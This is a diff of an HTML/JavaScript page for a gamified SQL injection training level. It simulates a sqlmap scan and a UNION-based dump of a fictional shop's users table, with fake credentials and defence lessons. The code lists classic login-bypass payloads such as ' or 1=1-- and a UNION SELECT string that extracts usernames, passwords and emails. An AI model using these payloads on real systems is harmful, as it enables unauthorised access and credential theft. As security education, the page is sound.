-            <div class="step-sub">Deploy sqlmap to enumerate the database schema and dump credentials</div>
-          </div>
-          <span class="step-badge badge-locked" id="sb2">🔒 LOCKED</span>
-        </div>
-        <div class="step-body">
-          <div class="callout warn" style="margin-bottom:16px;">
-            <strong>⚙️ Tool Loaded:</strong> sqlmap v1.7.8 — HTTP-based SQL injection scanner<br/>
-            Target: <code>shopvault.net/login.php?username=1</code> · Technique: <code>UNION-based</code>
-          </div>
-          <div class="terminal">
-            <div class="terminal-bar">
-              <div class="t-dot t-red"></div>
-              <div class="t-dot t-yellow"></div>
-              <div class="t-dot t-green-dot"></div>
-              <div class="terminal-title">SQLMAP TERMINAL — shopvault.net/login.php</div>
-            </div>
-            <div class="terminal-body" id="sqlmapLog">
-              <div class="t-line t-dim">sqlmap v1.7.8 — automatic SQL injection tool</div>
-              <div class="t-line t-dim">────────────────────────────────────────────</div>
-              <div class="t-line t-warn">[READY] Awaiting operator command…</div>
-            </div>
-          </div>
-          <button class="btn-launch" id="launchBtn" onclick="launchSqlmap()"><span>⚡</span> EXECUTE SQLMAP SCAN</button>
-          <div class="dict-stats">
-            <div class="dstat"><div class="dstat-val" id="smPayloads">0</div><div class="dstat-lbl">PAYLOADS</div></div>
-            <div class="dstat"><div class="dstat-val" id="smTables">0</div><div class="dstat-lbl">TABLES FOUND</div></div>
-            <div class="dstat"><div class="dstat-val" id="smStatus">—</div><div class="dstat-lbl">STATUS</div></div>
-          </div>
-          <div class="vuln-popup" id="sqlmapVuln" style="margin-top:14px;">
-            <div class="vuln-title">✅ LESSON: Why sqlmap Is So Dangerous</div>
-            <div class="vuln-body">
-              sqlmap automatically detects injection points, tests all techniques (Error, Union, Blind, Time-based), dumps the entire database schema, and extracts table data — all without manual effort. A vulnerable endpoint can be <strong>fully compromised in minutes.</strong><br/><br/>
-              <strong>Defence:</strong> Parameterized queries + WAF rules make automated scanning ineffective.
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Phase 2.3 -->
-      <div class="step-card s-locked" id="sc3">
-        <div class="step-hdr">
-          <div class="step-num" id="sn3">3</div>
-          <div class="step-meta">
-            <div class="step-title">Phase 2.3 — UNION-Based Data Extraction</div>
-            <div class="step-sub">Watch the database dump credentials row by row in real time</div>
-          </div>
-          <span class="step-badge badge-locked" id="sb3">🔒 LOCKED</span>
-        </div>
-        <div class="step-body">
-          <div class="callout danger" style="margin-bottom:16px;">
-            <strong>🔥 Simulating:</strong> UNION SELECT injection extracting the full <code>users</code> table<br/>
-            Payload: <code style="color:var(--red)">1' UNION SELECT username,password,email FROM users--</code>
-          </div>
-          <div class="query-display">
-            <span class="kw">SELECT</span> first_name, last_name <span class="kw">FROM</span> users <span class="kw">WHERE</span> user_id = '<span class="inj">1' UNION SELECT username,password,email FROM users--</span>'
-          </div>
-          <div class="extract-machine">
-            <div class="extract-label">◈ REAL-TIME DATABASE ROW EXTRACTION</div>
-            <div class="extract-progress">
-              <div class="ep-lbl"><span>EXTRACTION PROGRESS</span><span id="epPct">0%</span></div>
-              <div class="ep-track"><div class="ep-fill" id="epFill"></div></div>
-            </div>
-            <table class="db-table">
-              <thead><tr><th>USERNAME</th><th>PASSWORD HASH</th><th>EMAIL</th></tr></thead>
-              <tbody>
-                <tr><td id="r0c0">▓▓▓▓▓▓▓</td><td id="r0c1">▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓</td><td id="r0c2">▓▓▓▓▓▓▓▓▓▓▓▓</td></tr>
-                <tr><td id="r1c0">▓▓▓▓▓▓▓</td><td id="r1c1">▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓</td><td id="r1c2">▓▓▓▓▓▓▓▓▓▓▓▓</td></tr>
-                <tr><td id="r2c0">▓▓▓▓▓▓▓</td><td id="r2c1">▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓</td><td id="r2c2">▓▓▓▓▓▓▓▓▓▓▓▓</td></tr>
-                <tr><td id="r3c0">▓▓▓▓▓▓▓</td><td id="r3c1">▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓</td><td id="r3c2">▓▓▓▓▓▓▓▓▓▓▓▓</td></tr>
-              </tbody>
-            </table>
-          </div>
-          <button class="btn-extract" id="extractBtn" onclick="launchExtraction()">☢ INITIATE UNION EXTRACTION</button>
-          <div class="breach-alert" id="breachAlert">
-            <div class="breach-ico">💀</div>
-            <div class="breach-title">DATABASE DUMPED</div>
-            <div class="breach-sub">
-              Full <code style="color:var(--red);font-size:15px;">users</code> table extracted in <strong>0.8 seconds</strong>.<br/><br/>
-              A single unsanitized input field handed over <strong>every username, password hash, and email</strong> in the database. The attacker now has everything needed for offline cracking or credential stuffing attacks.<br/><br/>
-              <strong>No brute force. No malware. Just one carefully crafted SQL payload.</strong>
-            </div>
-            <button class="btn-complete" onclick="completeLevel()">✓ COMPLETE LEVEL 2 — RETURN TO SQL INJECTION</button>
-          </div>
-        </div>
-      </div>
-
-    </div>
   </div>
-</div>
-</div>
 
-<script>
-function goHome() { window.location.href = 'index.html'; }
-function goSqiLevels() { sessionStorage.setItem('ss_goto','page-sqilevels'); window.location.href='index.html'; }
-function logout() { localStorage.removeItem('ss_user'); window.location.href='index.html'; }
+  <script>
+    function goHome() { window.location.href = 'index.html'; }
+    function goSqiLevels() { sessionStorage.setItem('ss_goto', 'page-sqilevels'); window.location.href = 'index.html'; }
+    function logout() { localStorage.removeItem('ss_user'); window.location.href = 'index.html'; }
 
-let injectAttempts=0, l2p1=false, l2p2=false, l2p3=false;
-let sqlmapRunning=false, extractRunning=false;
+    let injectAttempts = 0, l2p1 = false, l2p2 = false, l2p3 = false;
+    let sqlmapRunning = false, extractRunning = false;
 
-window.addEventListener('DOMContentLoaded',()=>{
-  const saved=localStorage.getItem('ss_user');
-  if(!saved){window.location.href='index.html';return;}
-  const u=JSON.parse(saved);
-  const l1=u.progress?.sqli?.level1||{};
-  if([l1.p1,l1.p2,l1.p3].filter(Boolean).length<3){window.location.href='index.html';return;}
-  document.getElementById('navUser').textContent=u.username;
-  document.getElementById('navUser').classList.add('show');
-  document.getElementById('navLogout').classList.add('show');
-  restoreProgress(u);
-  document.getElementById('injectInput').addEventListener('keydown',e=>{if(e.key==='Enter')tryInject();});
-});
+    window.addEventListener('DOMContentLoaded', () => {
+      const saved = localStorage.getItem('ss_user');
+      if (!saved) { window.location.href = 'index.html'; return; }
+      const u = JSON.parse(saved);
+      const l1 = u.progress?.sqli?.level1 || {};
+      if ([l1.p1, l1.p2, l1.p3].filter(Boolean).length < 3) { window.location.href = 'index.html'; return; }
+      document.getElementById('navUser').textContent = u.username;
+      document.getElementById('navUser').classList.add('show');
+      document.getElementById('navLogout').classList.add('show');
+      restoreProgress(u);
+      document.getElementById('injectInput').addEventListener('keydown', e => { if (e.key === 'Enter') tryInject(); });
+    });
 
-function restoreProgress(u){
-  const l2=u.progress?.sqli?.level2||{};
-  if(l2.p1){l2p1=true;markDone(1);unlockStep(2);}
-  if(l2.p2){l2p2=true;markDone(2);unlockStep(3);}
-  if(l2.p3){l2p3=true;markDone(3);}
-  updateL2Bar();
-}
-function updateL2Bar(){
-  const done=[l2p1,l2p2,l2p3].filter(Boolean).length;
-  const pct=Math.round((done/3)*100);
-  document.getElementById('l2progFill').style.width=pct+'%';
-  document.getElementById('l2progPct').textContent=pct+'%';
-}
-function markDone(n){
-  document.getElementById('sc'+n).className='step-card s-done';
-  const num=document.getElementById('sn'+n);
-  num.style.cssText='width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:Orbitron,sans-serif;font-size:11px;font-weight:700;flex-shrink:0;border:2px solid var(--green);color:var(--green);background:rgba(0,255,136,0.1);';
-  num.textContent='✓';
-  const b=document.getElementById('sb'+n);
-  b.textContent='COMPLETE';b.className='step-badge badge-done';
-}
-function unlockStep(n){
-  document.getElementById('sc'+n).className='step-card s-active';
-  const b=document.getElementById('sb'+n);
-  b.textContent='ACTIVE';b.className='step-badge badge-active';
-}
-
-const BYPASS_PAYLOADS=["' or '1'='1","' or 1=1--","admin'--","' or '1'='1'--","admin' or '1'='1","' or 1=1#","admin' or 1=1--","' or 'x'='x","1' or '1'='1","' or true--","anything' or 1=1--"];
-function setPayload(v){document.getElementById('injectInput').value=v;document.getElementById('injectInput').focus();}
-function tryInject(){
-  if(l2p1)return;
-  const inp=document.getElementById('injectInput');
-  const val=inp.value.trim().toLowerCase();
-  const result=document.getElementById('injectResult');
-  if(!val)return;
-  injectAttempts++;
-  document.getElementById('injectCount').textContent=injectAttempts;
-  const isInj=/['";\-\-#]|or\s+|union|select/i.test(val);
-  if(BYPASS_PAYLOADS.some(p=>val.includes(p.toLowerCase()))){
-    inp.classList.add('injected');inp.disabled=true;
-    result.className='ls-result show success';
-    result.innerHTML='✅ ACCESS GRANTED — Logged in as: <strong>admin</strong> (all rows returned)';
-    document.getElementById('injectVuln').classList.add('show');
-    l2p1=true;saveP('p1');updateL2Bar();
-    setTimeout(()=>{markDone(1);unlockStep(2);},800);
-  }else if(val==="admin'"||val==="'"){
-    result.className='ls-result show warn';
-    result.textContent='⚠ SQL ERROR: You have an error in your SQL syntax — the DB is vulnerable! Now complete the payload.';
-  }else if(isInj){
-    result.className='ls-result show warn';
-    const hints=['❌ Injection detected but logic incorrect — try making the WHERE clause always true.','❌ Close! Make sure to comment out the rest of the query with -- after your payload.','❌ You\'re on the right track — combine OR with a tautology like 1=1.','❌ Almost there — the payload needs to evaluate to true for all rows.'];
-    result.innerHTML=`<span>${hints[Math.min(injectAttempts-1,hints.length-1)]}</span>`;
-  }else{
-    result.className='ls-result show fail';
-    const taunts=[`❌ "${inp.value.trim()}" — Invalid credentials. Not an injection.`,`❌ Wrong. Try using special characters like ' to probe the query.`,`❌ No match. Start with a single quote to break the query syntax.`,`❌ Keep probing. Use ' to trigger a SQL error first.`];
-    result.textContent=taunts[Math.min(injectAttempts-1,taunts.length-1)];
-    inp.style.borderColor='var(--red)';
-    setTimeout(()=>{inp.style.borderColor='';inp.value='';},500);
-  }
-}
-
-const SQLMAP_SEQ=[
-  {cls:'t-cmd',text:'$ sqlmap -u "http://shopvault.net/login.php?username=1" --batch --dbs'},
-  {cls:'t-dim',text:'────────────────────────────────────────────'},
-  {cls:'t-warn',text:"[INFO] Testing connection to target URL..."},
-  {cls:'t-warn',text:"[INFO] Testing if target URL content is stable..."},
-  {cls:'t-warn',text:"[INFO] Testing parameter 'username' for SQL injection..."},
-  {cls:'t-fail',text:"[TEST] Payload: username=1'"},
-  {cls:'t-warn',text:"[INFO] GET parameter 'username' appears to be injectable"},
-  {cls:'t-warn',text:"[INFO] Heuristic (basic) test shows GET param is injectable"},
-  {cls:'t-ok',text:"[FOUND] GET parameter 'username' is vulnerable!"},
-  {cls:'t-dim',text:'────────────────────────────────────────────'},
-  {cls:'t-warn',text:"[INFO] Testing UNION query injection technique..."},
-  {cls:'t-fail',text:"[TEST] 1 UNION SELECT NULL-- (columns: 1) ... FAIL"},
-  {cls:'t-fail',text:"[TEST] 1 UNION SELECT NULL,NULL-- (columns: 2) ... FAIL"},
-  {cls:'t-ok',text:"[FOUND] UNION query — 3 columns confirmed"},
-  {cls:'t-dim',text:'────────────────────────────────────────────'},
-  {cls:'t-warn',text:"[INFO] Enumerating databases..."},
-  {cls:'t-ok',text:"[DB] shopvault_db"},
-  {cls:'t-ok',text:"[DB] information_schema"},
-  {cls:'t-warn',text:"[INFO] Enumerating tables in 'shopvault_db'..."},
-  {cls:'t-ok',text:"[TABLE] users"},
-  {cls:'t-ok',text:"[TABLE] orders"},
-  {cls:'t-ok',text:"[TABLE] products"},
-  {cls:'t-warn',text:"[INFO] Fetching columns for table 'users'..."},
-  {cls:'t-data',text:"[COL] id, username, password, email, is_admin"},
-  {cls:'t-dim',text:'────────────────────────────────────────────'},
-  {cls:'t-ok',text:"[DONE] sqlmap identified the back-end DBMS: MySQL 5.7"},
-  {cls:'t-ok',text:"[DONE] Database 'shopvault_db' has 3 tables — use --dump to extract"},
-];
-let smIdx=0,smInterval=null;
-function launchSqlmap(){
-  if(sqlmapRunning||l2p2)return;
-  sqlmapRunning=true;
-  document.getElementById('launchBtn').disabled=true;
-  smIdx=0;
-  addSMLine('t-dim','────────────────────────────────────────────');
-  addSMLine('t-warn','[INIT] Loading sqlmap modules...');
-  let payloadCount=0,tableCount=0;
-  document.getElementById('smStatus').textContent='RUNNING';
-  document.getElementById('smStatus').style.color='var(--yellow)';
-  smInterval=setInterval(()=>{
-    if(smIdx<SQLMAP_SEQ.length){
-      const line=SQLMAP_SEQ[smIdx];
-      addSMLine(line.cls,line.text);
-      if(line.cls==='t-fail'){payloadCount++;document.getElementById('smPayloads').textContent=payloadCount;}
-      if(line.text.includes('[TABLE]')){tableCount++;document.getElementById('smTables').textContent=tableCount;}
-      smIdx++;
-    }else{
-      clearInterval(smInterval);
-      document.getElementById('smStatus').textContent='BREACHED';
-      document.getElementById('smStatus').style.color='var(--green)';
-      document.getElementById('sqlmapVuln').classList.add('show');
-      sqlmapRunning=false;l2p2=true;saveP('p2');updateL2Bar();
-      setTimeout(()=>{markDone(2);unlockStep(3);},800);
+    function restoreProgress(u) {
+      const l2 = u.progress?.sqli?.level2 || {};
+      if (l2.p1) { l2p1 = true; markDone(1); unlockStep(2); }
+      if (l2.p2) { l2p2 = true; markDone(2); unlockStep(3); }
+      if (l2.p3) { l2p3 = true; markDone(3); }
+      updateL2Bar();
     }
-  },260);
-}
-function addSMLine(cls,text){
-  const log=document.getElementById('sqlmapLog');
-  const div=document.createElement('div');
-  div.className='t-line '+cls;div.textContent=text;
-  log.appendChild(div);log.scrollTop=log.scrollHeight;
-}
-
-const DB_DATA=[
-  ['admin','5f4dcc3b5aa765d61d8327de','admin@shopvault.net'],
-  ['john_doe','e10adc3949ba59abbe56e057','john@shopvault.net'],
-  ['sarah_k','25d55ad283aa400af464c76d','sarah.k@shopvault.net'],
-  ['root','d8578edf8458ce06fbc5bb76','root@shopvault.net'],
-];
-const CHARS='abcdefghijklmnopqrstuvwxyz0123456789@._';
-function launchExtraction(){
-  if(extractRunning||l2p3)return;
-  extractRunning=true;
-  document.getElementById('extractBtn').disabled=true;
-  function extractRow(ri){
-    if(ri>=DB_DATA.length){
-      document.getElementById('epFill').style.width='100%';
-      document.getElementById('epPct').textContent='100%';
-      setTimeout(()=>{
-        document.getElementById('breachAlert').classList.add('show');
-        extractRunning=false;l2p3=true;saveP('p3');updateL2Bar();markDone(3);
-      },400);
-      return;
+    function updateL2Bar() {
+      const done = [l2p1, l2p2, l2p3].filter(Boolean).length;
+      const pct = Math.round((done / 3) * 100);
+      document.getElementById('l2progFill').style.width = pct + '%';
+      document.getElementById('l2progPct').textContent = pct + '%';
     }
-    const row=DB_DATA[ri];
-    for(let c=0;c<3;c++) document.getElementById(`r${ri}c${c}`).classList.add('spinning');
-    let colIdx=0;
-    function revealCol(){
-      if(colIdx>=3){
-        const pct=Math.round(((ri+1)/DB_DATA.length)*100);
-        document.getElementById('epFill').style.width=pct+'%';
-        document.getElementById('epPct').textContent=pct+'%';
-        setTimeout(()=>extractRow(ri+1),300);return;
+    function markDone(n) {
+      document.getElementById('sc' + n).className = 'step-card s-done';
+      const num = document.getElementById('sn' + n);
+      num.style.cssText = 'width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:Orbitron,sans-serif;font-size:11px;font-weight:700;flex-shrink:0;border:2px solid var(--green);color:var(--green);background:rgba(0,255,136,0.1);';
+      num.textContent = '✓';
+      const b = document.getElementById('sb' + n);
+      b.textContent = 'COMPLETE'; b.className = 'step-badge badge-done';
+    }
+    function unlockStep(n) {
+      document.getElementById('sc' + n).className = 'step-card s-active';
+      const b = document.getElementById('sb' + n);
+      b.textContent = 'ACTIVE'; b.className = 'step-badge badge-active';
+    }
+
+    const BYPASS_PAYLOADS = ["' or '1'='1", "' or 1=1--", "admin'--", "' or '1'='1'--", "admin' or '1'='1", "' or 1=1#", "admin' or 1=1--", "' or 'x'='x", "1' or '1'='1", "' or true--", "anything' or 1=1--"];
+    function setPayload(v) { document.getElementById('injectInput').value = v; document.getElementById('injectInput').focus(); }
+    function tryInject() {
+      if (l2p1) return;
+      const inp = document.getElementById('injectInput');
+      const val = inp.value.trim().toLowerCase();
+      const result = document.getElementById('injectResult');
+      if (!val) return;
+      injectAttempts++;
+      document.getElementById('injectCount').textContent = injectAttempts;
+      const isInj = /['";\-\-#]|or\s+|union|select/i.test(val);
+      if (BYPASS_PAYLOADS.some(p => val.includes(p.toLowerCase()))) {
+        inp.classList.add('injected'); inp.disabled = true;
+        result.className = 'ls-result show success';
+        result.innerHTML = '✅ ACCESS GRANTED — Logged in as: <strong>admin</strong> (all rows returned)';
+        document.getElementById('injectVuln').classList.add('show');
+        l2p1 = true; saveP('p1'); updateL2Bar();
+        setTimeout(() => { markDone(1); unlockStep(2); }, 800);
+      } else if (val === "admin'" || val === "'") {
+        result.className = 'ls-result show warn';
+        result.textContent = '⚠ SQL ERROR: You have an error in your SQL syntax — the DB is vulnerable! Now complete the payload.';
+      } else if (isInj) {
+        result.className = 'ls-result show warn';
+        const hints = ['❌ Injection detected but logic incorrect — try making the WHERE clause always true.', '❌ Close! Make sure to comment out the rest of the query with -- after your payload.', '❌ You\'re on the right track — combine OR with a tautology like 1=1.', '❌ Almost there — the payload needs to evaluate to true for all rows.'];
+        result.innerHTML = `<span>${hints[Math.min(injectAttempts - 1, hints.length - 1)]}</span>`;
+      } else {
+        result.className = 'ls-result show fail';
+        const taunts = [`❌ "${inp.value.trim()}" — Invalid credentials. Not an injection.`, `❌ Wrong. Try using special characters like ' to probe the query.`, `❌ No match. Start with a single quote to break the query syntax.`, `❌ Keep probing. Use ' to trigger a SQL error first.`];
+        result.textContent = taunts[Math.min(injectAttempts - 1, taunts.length - 1)];
+        inp.style.borderColor = 'var(--red)';
+        setTimeout(() => { inp.style.borderColor = ''; inp.value = ''; }, 500);
       }
-      const cell=document.getElementById(`r${ri}c${colIdx}`);
-      cell.classList.remove('spinning');cell.classList.add('revealed');
-      cell.textContent=row[colIdx];colIdx++;
-      setTimeout(revealCol,350);
     }
-    setTimeout(revealCol,600);
-  }
-  const spinInterval=setInterval(()=>{
-    for(let ri=0;ri<DB_DATA.length;ri++){
-      for(let c=0;c<3;c++){
-        const cell=document.getElementById(`r${ri}c${c}`);
-        if(!cell.classList.contains('revealed')){
-          const len=[7,16,12][c];
-          cell.textContent=Array.from({length:len},()=>CHARS[Math.floor(Math.random()*CHARS.length)]).join('');
+
+    const SQLMAP_SEQ = [
+      { cls: 't-cmd', text: '$ sqlmap -u "http://shopvault.net/login.php?username=1" --batch --dbs' },
+      { cls: 't-dim', text: '────────────────────────────────────────────' },
+      { cls: 't-warn', text: "[INFO] Testing connection to target URL..." },
+      { cls: 't-warn', text: "[INFO] Testing if target URL content is stable..." },
+      { cls: 't-warn', text: "[INFO] Testing parameter 'username' for SQL injection..." },
+      { cls: 't-fail', text: "[TEST] Payload: username=1'" },
+      { cls: 't-warn', text: "[INFO] GET parameter 'username' appears to be injectable" },
+      { cls: 't-warn', text: "[INFO] Heuristic (basic) test shows GET param is injectable" },
+      { cls: 't-ok', text: "[FOUND] GET parameter 'username' is vulnerable!" },
+      { cls: 't-dim', text: '────────────────────────────────────────────' },
+      { cls: 't-warn', text: "[INFO] Testing UNION query injection technique..." },
+      { cls: 't-fail', text: "[TEST] 1 UNION SELECT NULL-- (columns: 1) ... FAIL" },
+      { cls: 't-fail', text: "[TEST] 1 UNION SELECT NULL,NULL-- (columns: 2) ... FAIL" },
+      { cls: 't-ok', text: "[FOUND] UNION query — 3 columns confirmed" },
+      { cls: 't-dim', text: '────────────────────────────────────────────' },
+      { cls: 't-warn', text: "[INFO] Enumerating databases..." },
+      { cls: 't-ok', text: "[DB] shopvault_db" },
+      { cls: 't-ok', text: "[DB] information_schema" },
+      { cls: 't-warn', text: "[INFO] Enumerating tables in 'shopvault_db'..." },
+      { cls: 't-ok', text: "[TABLE] users" },
+      { cls: 't-ok', text: "[TABLE] orders" },
+      { cls: 't-ok', text: "[TABLE] products" },
+      { cls: 't-warn', text: "[INFO] Fetching columns for table 'users'..." },
+      { cls: 't-data', text: "[COL] id, username, password, email, is_admin" },
+      { cls: 't-dim', text: '────────────────────────────────────────────' },
+      { cls: 't-ok', text: "[DONE] sqlmap identified the back-end DBMS: MySQL 5.7" },
+      { cls: 't-ok', text: "[DONE] Database 'shopvault_db' has 3 tables — use --dump to extract" },
+    ];
+    let smIdx = 0, smInterval = null;
+    function launchSqlmap() {
+      if (sqlmapRunning || l2p2) return;
+      sqlmapRunning = true;
+      document.getElementById('launchBtn').disabled = true;
+      smIdx = 0;
+      addSMLine('t-dim', '────────────────────────────────────────────');
+      addSMLine('t-warn', '[INIT] Loading sqlmap modules...');
+      let payloadCount = 0, tableCount = 0;
+      document.getElementById('smStatus').textContent = 'RUNNING';
+      document.getElementById('smStatus').style.color = 'var(--yellow)';
+      smInterval = setInterval(() => {
+        if (smIdx < SQLMAP_SEQ.length) {
+          const line = SQLMAP_SEQ[smIdx];
+          addSMLine(line.cls, line.text);
+          if (line.cls === 't-fail') { payloadCount++; document.getElementById('smPayloads').textContent = payloadCount; }
+          if (line.text.includes('[TABLE]')) { tableCount++; document.getElementById('smTables').textContent = tableCount; }
+          smIdx++;
+        } else {
+          clearInterval(smInterval);
+          document.getElementById('smStatus').textContent = 'BREACHED';
+          document.getElementById('smStatus').style.color = 'var(--green)';
+          document.getElementById('sqlmapVuln').classList.add('show');
+          sqlmapRunning = false; l2p2 = true; saveP('p2'); updateL2Bar();
+          setTimeout(() => { markDone(2); unlockStep(3); }, 800);
         }
-      }
+      }, 260);
     }
-  },80);
-  setTimeout(()=>{clearInterval(spinInterval);extractRow(0);},800);
-}
+    function addSMLine(cls, text) {
+      const log = document.getElementById('sqlmapLog');
+      const div = document.createElement('div');
+      div.className = 't-line ' + cls; div.textContent = text;
+      log.appendChild(div); log.scrollTop = log.scrollHeight;
+    }
 
-async function saveP(part){
-  const saved=localStorage.getItem('ss_user');
-  if(!saved)return;
-  const u=JSON.parse(saved);
-  if(!u.progress)u.progress={};
-  if(!u.progress.sqli)u.progress.sqli={};
-  if(!u.progress.sqli.level2)u.progress.sqli.level2={};
-  u.progress.sqli.level2[part]=true;
-  localStorage.setItem('ss_user',JSON.stringify(u));
-  try{await fetch(`${window.location.origin}/api/progress/${u.username}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({game:'sqli',level:'level2',mode:part,completed:true})});}catch{}
-}
-function completeLevel(){
-  const saved=localStorage.getItem('ss_user');
-  if(saved){
-    const u=JSON.parse(saved);
-    if(!u.progress)u.progress={};
-    if(!u.progress.sqli)u.progress.sqli={};
-    u.progress.sqli.level2={p1:true,p2:true,p3:true,complete:true};
-    localStorage.setItem('ss_user',JSON.stringify(u));
-  }
-  sessionStorage.setItem('ss_goto','page-sqilevels');
-  window.location.href='index.html';
-}
-</script>
+    const DB_DATA = [
+      ['admin', '5f4dcc3b5aa765d61d8327de', 'admin@shopvault.net'],
+      ['john_doe', 'e10adc3949ba59abbe56e057', 'john@shopvault.net'],
+      ['sarah_k', '25d55ad283aa400af464c76d', 'sarah.k@shopvault.net'],
+      ['root', 'd8578edf8458ce06fbc5bb76', 'root@shopvault.net'],
+    ];
+    const CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789@._';
+    function launchExtraction() {
+      if (extractRunning || l2p3) return;
+      extractRunning = true;
+      document.getElementById('extractBtn').disabled = true;
+      function extractRow(ri) {
+        if (ri >= DB_DATA.length) {
+          document.getElementById('epFill').style.width = '100%';
+          document.getElementById('epPct').textContent = '100%';
+          setTimeout(() => {
+            document.getElementById('breachAlert').classList.add('show');
+            extractRunning = false; l2p3 = true; saveP('p3'); updateL2Bar(); markDone(3);
+          }, 400);
+          return;
+        }
+        const row = DB_DATA[ri];
+        for (let c = 0; c < 3; c++) document.getElementById(`r${ri}c${c}`).classList.add('spinning');
+        let colIdx = 0;
+        function revealCol() {
+          if (colIdx >= 3) {
+            const pct = Math.round(((ri + 1) / DB_DATA.length) * 100);
+            document.getElementById('epFill').style.width = pct + '%';
+            document.getElementById('epPct').textContent = pct + '%';
+            setTimeout(() => extractRow(ri + 1), 300); return;
+          }
+          const cell = document.getElementById(`r${ri}c${colIdx}`);
+          cell.classList.remove('spinning'); cell.classList.add('revealed');
+          cell.textContent = row[colIdx]; colIdx++;
+          setTimeout(revealCol, 350);
+        }
+        setTimeout(revealCol, 600);
+      }
+      const spinInterval = setInterval(() => {
+        for (let ri = 0; ri < DB_DATA.length; ri++) {
+          for (let c = 0; c < 3; c++) {
+            const cell = document.getElementById(`r${ri}c${c}`);
+            if (!cell.classList.contains('revealed')) {
+              const len = [7, 16, 12][c];
+              cell.textContent = Array.from({ length: len }, () => CHARS[Math.floor(Math.random() * CHARS.length)]).join('');
+            }
+          }
+        }
+      }, 80);
+      setTimeout(() => { clearInterval(spinInterval); extractRow(0); }, 800);
+    }
+
+    async function saveP(part) {
+      const saved = localStorage.getItem('ss_user');
+      if (!saved) return;
+      const u = JSON.parse(saved);
+      if (!u.progress) u.progress = {};
+      if (!u.progress.sqli) u.progress.sqli = {};
+      if (!u.progress.sqli.level2) u.progress.sqli.level2 = {};
+      u.progress.sqli.level2[part] = true;
+      localStorage.setItem('ss_user', JSON.stringify(u));
+      try { await fetch(`${window.location.origin}/api/progress/${u.username}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ game: 'sqli', level: 'level2', mode: part, completed: true }) }); } catch { }
+    }
+    function completeLevel() {
+      const saved = localStorage.getItem('ss_user');
+      if (saved) {
+        const u = JSON.parse(saved);
+        if (!u.progress) u.progress = {};
+        if (!u.progress.sqli) u.progress.sqli = {};
+        u.progress.sqli.level2 = { p1: true, p2: true, p3: true, complete: true };
+        localStorage.setItem('ss_user', JSON.stringify(u));
+      }
+      sessionStorage.setItem('ss_goto', 'page-sqilevels');
+      window.location.href = 'index.html';
+    }
+  </script>
 </body>
+
 </html>
